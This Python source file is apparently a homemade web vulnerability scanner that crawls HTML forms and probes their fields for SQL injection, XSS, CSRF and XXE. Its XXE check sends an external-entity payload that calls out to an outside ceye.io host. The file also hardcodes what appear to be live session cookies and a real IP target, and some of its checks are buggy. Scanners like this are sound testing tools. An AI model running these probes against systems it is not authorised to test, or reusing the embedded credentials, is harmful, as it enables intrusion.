#coding:utf-8
from bs4 import BeautifulSoup
import requests
import http.cookiejar
import ssl
import urllib.request
import base64
from copy import deepcopy
import time
import random
import sys
sys.path.insert(0,'.')
from config import config

def geturl(url,action):
    if '/' in url.split("//")[1]:
        sign = url.split('/')[-1]
        if sign:
            url = url.split(sign, 1)[0] + action
        if sign == None:
            url = url + action
        else:
            url = url + action
    return url

def random_str():
    data = "123456789zxcvbnmasdfghjklqwertyuiop"
    random.seed(time.time())
    sa = []
    for i in range(6):
        sa.append(random.choice(data))
        random_str = "jinny_" + "".join(sa)
    return random_str

class Tags(object):
    def __init__(self,target_url):
        self.target_url = target_url

    def exec(self):
        try:
            s = requests.Session()
            headers = {
                "Cookie": "token=8a6bcb60a8f64f2db16a62d5272fc30e; JSESSIONID=BFB6D1D3D5C94E69053DDF7B170E8BD4; rememberMe=4AudlG0q1B7K1IPM3xMyG2VzY0hnSVn1bmiFL42CwSmuYZ8/AKf7rFXAI13vZzdOLBIzl8KlkBs43ZZ3WV3RznBAxUm7GERviz6c0AGRLoKcbl6C7SOxN1ClO0NXqZKNVQ1WbV9R4rFv6DlQjJlM9JSDnax0AR2AhdEzqwfE/vXfGnAU6wgGjzEjXv+6JqQ3SlXheUbEBLM7wyO9cUYQqEV1KqEZ5X78beUwAE9sm3rZEAUpmikeKGlDPUcHklcaXHDIBpTyxh7BIb+WEVSD9Ev+iz5gVnFDZJeAN5SOQvJuUdq+pplIE/RpJ5WQ02/VHNGIZ5R28UPK8ArFiGsZKnRNEvmSroBt/YQ/1XHc6hoNnrrbW5fVIH6OsYITIy+FT8QcFrOjrntFEFeN91B0iXIHxl+zNLBhjtCdmhZYNyLZoRQZGfJpQZJF1elssI2LwNH34Td49RS8vvV/sAhe09lthfnYWdMAcT4bw5rDlIWnFjvfDAb4arv/evmC1+wHRbYHH/zgYZCQIJJmJQUFQikRHuxv+XzbBesjvkOWeL4F6c4p/YRJS/vB0A3FiPjFpzXf4p+iQur5c/vqDyFT1Oyi16TRynBhDwKiasI7nD0gqcYh7KcSsZV7BOzDE+u2ucIFpAZb/b9j8LBX5//5Z2H/SLSuCwuWfR6ZXMzKYYcKin9yXJhnwFmsaz6fh1jwClSAlsnxYChSW+HMh6zSzIj0VLk35s7oIjVncJusYPZUd4nuwX1qPvEt4X3yXv5fRvytEh6zpgWohA19pl+9OtoNTvm+KI7wbqjawE253qmJZ+wz5QIx26JAvPEXcjA8j6cRE9edP1qekuOFnn2KreoTAWbdeogRqq7K3L+obXNutTzvsrB2nydYwNfgC0Xl0O+qUdZY7q0W/0EFYW9zMl3j426quDTVYn3n/AC2hhSIm3N++fBfeXdTfgmHpEwCFNbqI8tESrwqfm8YFoDSEu0epYcfEMP0nOHYeyFyqZvmW6eXAl6J3P+5CeSAbmtWxAzskzwWun4/zipjTY0tkx7WDql5aHbUkHcBLetI5/s8tNyHILVvSa+EfCxXKPgEmL0vFZ3p1Qnu7nHSe9NiiLbnlglWMmJYkSb9AOriut1ASFo9WWz902RDbRhFrawkzfbbnpVZcHYbXXfIYGR9+IFC3zMbok2oRKeQIwaa9vKU4mj58ZqwD5XDP3VL3ApKTrjqt2+rhjY8WjFlf8mWZxd5uV29nAD+Iqpji8YjqangLgVsAFdYLgAczgG15/xdHqGmnPwzCLNt0Tuy2zRQ5G302W1s7lLDxq9sy0yT2IM5hNSrx3RbuhEROqXS/dUduLkXwC2dtTD541m5KnvOPxkk4WyQKoj7Sy7CgoekyzUPio87uoq3vOQDszaBIVr7RDjYB3aqWpWhHQjUZgOnSmskspnKJh1M3MAuBqJz7z7WwBxrs9jQMN/a2lquUcfveibkAEjVYFMj7ZkTUH+au2lcy0p5Pzjz8jybVddewz/RA5Kie7BZluxbNjdnqVnq4vr8apqiPSwhKitRuF0kMqeZZKT/yDYIcVeHapi9Wu/29oSjIwjXyytYRqTEWueUHlQPeWG09iVClbvr1xOdMke0qSxWJAWbFwxEEavlaXBtbJMJkPkaVuzus80j+7mzOefsaZI0K7pZQwUAdhmeoMyRyZ0qjujksCQUR1ri8uaehw7Xg0VLarKPPgz2gxu1EhZFrl4t/h89pQHivX+IUYNz7X4R+YtE/ohUbkFNBOFvmkYCuc+WUqfPUlkvTSfQO9uzHqNbNlc1/wpufw+MRg==; BIGipServerruzhi_server8090_pool=509346496.39455.0000"
            }
            response = s.get(self.target_url)
            #print(response.content)
        except(requests.exceptions.ConnectionError):
            print(self.target_url + "目标无法连接")
            return None
        html = BeautifulSoup(response.content,'lxml')
        #print(html)
        result = {}
        if html.find("form"):
            for tags in html.find_all("form"):
                #print(tags)
                i = 0
                try:
                    action = tags["action"]
                except(KeyError):
                    action = ""
                #print(action)
                try:
                    method = tags["method"]
                    if tags["method"] == None or tags["method"] == "":
                        method = "POST"
                except(KeyError):
                    method = "POST"
                if result.get(action) == None:
                    result[action] = {}
                    result[action]["POST"] = {}
                    result[action]["GET"] = {}
                for tag in tags.find_all("input"):
                    #print(tag)
                    try:
                        if tag['name']:
                            name = tag['name']
                            try:
                                value = tag['value']
                            except(KeyError):
                                value = ""
                            if method == "POST" or method == "post":
                                result[action]["POST"][name] = value
                            else:
                                result[action]["GET"][name] = value
                    except(KeyError):
                        continue
        #print(result)             #查看爬取到的form的action和method及input的name
        return result


class Sql():
    def __init__(self,url,params):
        self.url = url
        self.params =params
        #self.actions = actions

    def sql_scan(self):
        cookiejar = http.cookiejar.CookieJar()
        handler = urllib.request.HTTPCookieProcessor(cookiejar)
        opener = urllib.request.build_opener(handler)
        try:
            response = opener.open(self.url)
        except(urllib.error.URLError):
            print(self.url + "目标无法连接")
            return None
        actions = self.params.keys()
        payload = "1'"
        for action in actions:
            for method in self.params[action].keys():
                if method == "POST" or method == "post":
                    if self.params[action][method].keys() != "":
                        for param in self.params[action][method].keys():
                            tmp = self.params[action][method][param]
                            self.params[action][method][param] = payload
                            #print(params[action][method])
                            #print(self.url)
                            target_url = geturl(self.url, action)
                            #print(self.url)             #查看url的最终凭借情况
                            try:
                                #print(params)
                                response = requests.post(target_url,self.params[action][method])
                                response = response.content.decode()
                                #print(response)        #查看有无返回的响应数据
                                if "SQL syntax" in response:
                                    print(param + "参数疑是存在sql注入漏洞")
                            except(urllib.error.HTTPError):
                                self.params[action][method][param] = tmp
                                continue
                            self.params[action][method][param] = tmp

                elif method == "GET" or method == "get":
                    if self.params[action][method].keys() != "":
                        for param in self.params[action][method].keys():
                            tmp = self.params[action][method][param]
                            self.params[action][method][param] = payload
                            #print(params[action][method])
                            #print(self.url)
                            target_url = geturl(self.url, action)
                            #print(self.url)             #查看url的最终凭借情况
                            try:
                                #print(params)
                                response = requests.get(target_url,self.params[action][method])
                                response = response.content.decode()
                                #print(response)        #查看有无返回的响应数据
                                if "SQL syntax" in response:
                                    print(param + "参数存在sql注入漏洞")
                            except(urllib.error.HTTPError):
                                self.params[action][method][param] = tmp
                                continue
                            self.params[action][method][param] = tmp
                else:
                    pass


            #print(self.url)


        #print(cookiejar)





class Xss(object):
    def __init__(self,url,params):
        self.url = url
        self.params = params
        #self.action = actions

    def xss_scan(self):
        cookiejar = http.cookiejar.CookieJar()
        handler = urllib.request.HTTPCookieProcessor(cookiejar)
        opener = urllib.request.build_opener(handler)
        headers = {
            "Cookie":config.cookie
        }
        try:
            res = opener.open(self.url)
        except(urllib.error.URLError):
            print(self.url + "目标无法连接")
            return None
        payload = """1010"();}]1010"""
        #payload = ["""admin'"><script>alert(1)</script>""","""admin'"><script>alert(1)</script>""","""1010"();}]1010"""]
        actions = self.params.keys()
        #print(actions)
        for action in actions:
            #print(action)
            for method in self.params[action].keys():
                #print(method)
                if method == "POST":
                    if self.params[action][method].keys() != "":
                        #print(params[action][method])
                        for param in self.params[action][method].keys():
                            tmp = self.params[action][method][param]
                            self.params[action][method][param] = payload
                            #print(params[action][method])
                            #print(self.url)
                            target_url = geturl(self.url, action)
                            #print(self.url)             #查看url的最终凭借情况
                            try:
                                #print(params)
                                #target_url = "http://121.33.37.16:8090/phr/user/saveData"
                                response = requests.post(target_url,self.params[action][method])
                                #print(target_url)
                                response = response.content.decode()
                                self.params[action][method][param] = tmp
                                #print(response)        #查看有无返回的响应数据
                                html = BeautifulSoup(response,'lxml')
                                if payload in response:
                                    print(param + "参数疑是存在xss漏洞")
                                for tag in html.find_all("script"):
                                    #print(tag)
                                    if tag.text == "alert(1)":
                                        print(param + "参数存在xss漏洞")
                            except(urllib.error.HTTPError):
                                self.params[action][method][param] = tmp
                                print(target_url + "目标无法连接")
                                continue



class Csrf(object):
    def __init__(self,url,params):
        self.url = url
        self.params = params

    def csrf_scan(self):
        actions = self.params.keys()
        for action in actions:
            #print("ok")
            target_url = geturl(self.url,action)

            methods = self.params[action].keys()
            for method in methods:
                #print("ok")
                try:
                    sign = requests.post(target_url, self.params[action][method])
                except(urllib.error.HTTPError):
                    print(target_url + "目标无法连接")
                    continue
                tmp = self.params[action][method]
                param = deepcopy(tmp)
                headers = {
                    'Referer':'http://www.baidu.com'
                }
                if "captcha" in param.values():
                    print(target_url + "不存在CSRF")
                    continue
                elif param.get("token"):
                    param.pop("token")
                    if method == "POST":
                        sign = requests.post(target_url, self.params[action][method])
                        sign1 = requests.post(target_url, self.params[action][method],headers=headers)
                        response = requests.post(target_url,param)
                    else:
                        sign = requests.get(target_url, self.params[action][method])
                        sign1 = requests.get(target_url, self.params[action][method], headers=headers)
                        response = requests.get((target_url,param))
                    status_code = response.status_code
                    if response == sign:
                        if status_code == 200:
                            if response == sign1:
                                print(target_url + "存在CSRF")
                                continue
                    elif response != sign and response != sign1:
                        print(target_url + "不存在CSRF")
                else:
                    print(target_url + "   " + method  + "    方式存在CSRF")



class Xxe(object):
    def __init__(self,url,params):
        self.url = url
        self.params = params

    def xxe_scan(self):
        ceye_http = config.ceye_http
        actions = self.params.keys()
        header = {
            "Content-Type":"application/x-www-form-urlencoded"
        }
        proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}  #设置的默认代理，便于抓包
        for action in actions:
            mehtods = self.params[action].keys()
            i = 0
            if action == "" or action.strip() == "":
                target_url = self.url
            else:
                target_url = geturl(self.url, action)
            for mehtod in mehtods:
                if mehtod == "POST":
                    for param in self.params[action][mehtod].keys():
                        random = random_str()
                        payload = """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://vx8u3g.ceye.io/{0}">%remote;]>""".format(random)
                        tmp = self.params[action][mehtod][param]
                        self.params[action][mehtod][param] = payload
                        try:
                            response = requests.post(target_url,self.params[action][mehtod],headers=header)  #如果想抓取xxe的数据包，可以在此处添加代理
                            self.params[action][mehtod][param] = tmp
                            time.sleep(1)       #开启延迟减少漏报
                            result = requests.get(ceye_http).text
                        except(urllib.error.HTTPError):
                            print(target_url + "目标无法连接")
                            self.params[action][mehtod][param] = tmp
                            continue
                        #print(result)
                        if random in result:
                            print(target_url + "   " + param +"   参数    "+ mehtod + "方式存在XXE")
                            i = i + 1
                else:
                    for param in self.params[action][mehtod].keys():
                        random = random_str()
                        payload = """<?xml version="1.0" encoding="UTF-8"?>
                        <!DOCTYPE root [
                        <!ENTITY % remote SYSTEM "http://vx8u3g.ceye.io/{0}">
                        %remote;]>""".format(random)
                        tmp = self.params[action][mehtod][param]
                        self.params[action][mehtod][param] = payload
                        try:
                            response = requests.get(target_url,self.params[action][mehtod])
                            self.params[action][mehtod][param] = tmp
                            time.sleep(1)
                            result = requests.get(ceye_http)
                        except(urllib.error.HTTPError):
                            print(target_url + "目标无法连接")
                            self.params[action][mehtod][param] = tmp
                            continue
                        if random in result:
                            print(target_url + "   " + param +"   参数    "+ mehtod + "方式存在XXE")
                            i = i+ 1
            if i < 1:
                print(target_url + "不存在XXE")




class Burst(object):
    def __init__(self):
        pass

    def burst_scan(self):
        pass

def vul_scan(target_url):
    #url = "http://www.baidu.com"
    #url = "http://127.0.0.1:8082/demo/echo.html"
    #url = "http://127.0.0.1:8082/sqli-labs/Less-11/"
    url = target_url
    tags = Tags(url)
    params = tags.exec()
    print(tags.exec())
    sql = Sql(url,params)
    sql.sql_scan()
    xss = Xss(url,params)
    xss.xss_scan()
    csrf = Csrf(url,params)
    csrf.csrf_scan()
    xxe = Xxe(url,params)
    xxe.xxe_scan()

